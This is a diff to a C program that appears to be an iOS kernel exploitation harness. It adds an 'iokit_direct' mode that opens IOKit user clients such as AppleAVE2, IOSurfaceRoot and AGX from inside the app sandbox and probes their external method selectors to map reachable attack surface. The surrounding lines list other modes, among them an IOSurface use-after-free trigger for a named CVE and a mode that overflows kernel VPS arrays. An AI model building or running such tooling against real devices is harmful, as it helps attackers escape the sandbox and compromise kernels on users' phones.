@@ -8355,6 +8355,154 @@ vps_cd_done:
 
         rlog("=== VPS_BYTE_DUMP complete ===\n");
 
+    } else if (strcmp(mode, "iokit_direct") == 0) {
+        /*
+         * iokit_direct — Probe IOKit user clients reachable from app sandbox
+         *
+         * Tests whether AppleAVE2, AppleAVE2Driver, IOSurface, and other
+         * hardware encoder user clients can be opened directly, bypassing
+         * the mediaserverd XPC layer. If accessible, we can send raw
+         * external method calls with crafted parameters.
+         */
+        rlog("=== IOKIT_DIRECT: Probing IOKit user client access from sandbox ===\n\n");
+
+        /* Test a range of IOKit service names */
+        const char *services[] = {
+            "AppleAVE2",
+            "AppleAVE2Driver",
+            "AppleAVE2V2",
+            "AppleVXE380",
+            "AppleVXD394",
+            "IOSurfaceRoot",
+            "AppleH13CamIn",
+            "AppleSPU",
+            "AGXAccelerator",
+            "AGXDevice",
+            "IOGPUDevice",
+            "AppleJPEGDriver",
+            "AppleARMIODevice",
+            "IOHIDSystem",
+            NULL
+        };
+
+        for (int si = 0; services[si]; si++) {
+            io_service_t svc = IOServiceGetMatchingService(
+                kIOMasterPortDefault,
+                IOServiceMatching(services[si]));
+            if (!svc) {
+                rlog("  %-24s: NOT FOUND (no matching service)\n", services[si]);
+                continue;
+            }
+            rlog("  %-24s: FOUND (port=%d)", services[si], svc);
+
+            /* Try to open with different types */
+            io_connect_t conn = 0;
+            kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
+            rlog(" open(0)=%d", kr);
+            if (kr == KERN_SUCCESS && conn) {
+                rlog(" CONN=%d", conn);
+
+                /* Try to get external method count */
+                for (uint32_t sel = 0; sel < 20; sel++) {
+                    uint64_t out[16] = {0};
+                    uint32_t out_cnt = 16;
+                    kr = IOConnectCallScalarMethod(conn, sel, NULL, 0, out, &out_cnt);
+                    if (kr != 0xe00002c2 /* kIOReturnBadArgument */ &&
+                        kr != 0xe00002bc /* kIOReturnUnsupported */) {
+                        rlog("\n    sel=%u: kr=0x%x out_cnt=%u", sel, kr, out_cnt);
+                        if (out_cnt > 0) {
+                            rlog(" out[0]=0x%llx", out[0]);
+                        }
+                    }
+                }
+
+                /* Try struct methods too */
+                for (uint32_t sel = 0; sel < 20; sel++) {
+                    char obuf[256] = {0};
+                    size_t olen = sizeof(obuf);
+                    kr = IOConnectCallStructMethod(conn, sel, NULL, 0, obuf, &olen);
+                    if (kr != 0xe00002c2 && kr != 0xe00002bc &&
+                        kr != 0xe00002c7 /* kIOReturnNotAttached */) {
+                        rlog("\n    struct sel=%u: kr=0x%x olen=%zu", sel, kr, olen);
+                    }
+                }
+
+                IOServiceClose(conn);
+            }
+
+            /* Try type 1 */
+            conn = 0;
+            kr = IOServiceOpen(svc, mach_task_self(), 1, &conn);
+            if (kr == KERN_SUCCESS) {
+                rlog(" open(1)=OK conn=%d", conn);
+                IOServiceClose(conn);
+            }
+
+            IOObjectRelease(svc);
+            rlog("\n");
+        }
+
+        /* Also try iterating IORegistry for all AVE-related entries */
+        rlog("\n--- IORegistry search for AVE/encoder entries ---\n");
+        io_iterator_t iter = 0;
+        kern_return_t kr = IOServiceGetMatchingServices(
+            kIOMasterPortDefault,
+            IOServiceMatching("IOService"),
+            &iter);
+        if (kr == KERN_SUCCESS && iter) {
+            io_service_t svc;
+            int found = 0;
+            while ((svc = IOIteratorNext(iter)) != 0) {
+                io_name_t name;
+                IORegistryEntryGetName(svc, name);
+                if (strstr(name, "AVE") || strstr(name, "VXE") ||
+                    strstr(name, "VXD") || strstr(name, "Encode") ||
+                    strstr(name, "JPE") || strstr(name, "GPU")) {
+                    rlog("  found: %s\n", name);
+                    found++;
+                    if (found > 20) break;
+                }
+                IOObjectRelease(svc);
+            }
+            IOObjectRelease(iter);
+            if (found == 0) rlog("  (none found with AVE/VXE/VXD/Encode/JPE/GPU)\n");
+        } else {
+            rlog("  IOServiceGetMatchingServices failed: 0x%x\n", kr);
+        }
+
+        /* Test IOSurface external methods - known reachable */
+        rlog("\n--- IOSurface external method probe ---\n");
+        {
+            io_service_t svc = IOServiceGetMatchingService(
+                kIOMasterPortDefault,
+                IOServiceMatching("IOSurfaceRoot"));
+            if (svc) {
+                io_connect_t conn = 0;
+                kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
+                rlog("IOSurfaceRoot open: kr=0x%x conn=%d\n", kr, conn);
+                if (kr == KERN_SUCCESS && conn) {
+                    /* Probe selectors 0-30 to map the external method table */
+                    rlog("Selector probe (scalar):\n");
+                    for (uint32_t sel = 0; sel <= 30; sel++) {
+                        uint64_t in[8] = {0};
+                        uint32_t in_cnt = 0;
+                        uint64_t out[16] = {0};
+                        uint32_t out_cnt = 16;
+                        kr = IOConnectCallScalarMethod(conn, sel, in, in_cnt, out, &out_cnt);
+                        if (kr != 0xe00002bc) { /* not unsupported */
+                            rlog("  sel=%2u: kr=0x%08x outs=%u", sel, kr, out_cnt);
+                            if (out_cnt > 0) rlog(" [0]=0x%llx", out[0]);
+                            rlog("\n");
+                        }
+                    }
+                    IOServiceClose(conn);
+                }
+                IOObjectRelease(svc);
+            }
+        }
+
+        rlog("\n=== IOKIT_DIRECT complete ===\n");
+
     } else if (strcmp(mode, "iosurface_uaf") == 0) {
         /*
          * iosurface_uaf — CVE-2026-112477 IOSurface UAF trigger
@@ -8875,6 +9023,7 @@ vps_cd_done:
         rlog("  vps_overflow       -- KEY: Set >64 MV-HEVC layers to overflow kernel VPS arrays\n");
         rlog("  iokit_vps [phase]  -- Direct IOKit probe: enumerate AVE service + craft VPS\n");
         rlog("  iokit_enum         -- Enumerate all IOKit video encoder services\n");
+        rlog("  iokit_direct       -- KEY: Probe IOKit user clients reachable from sandbox\n");
         rlog("  transcode_vps      -- KEY: Decode crafted VPS then re-encode (transcode path)\n");
         rlog("  vps_verify         -- Verify if crafted VPS reaches kernel (compare output)\n");
         rlog("  xpc_vps [phase]    -- XPC VPS field manipulation + crafted format injection\n");
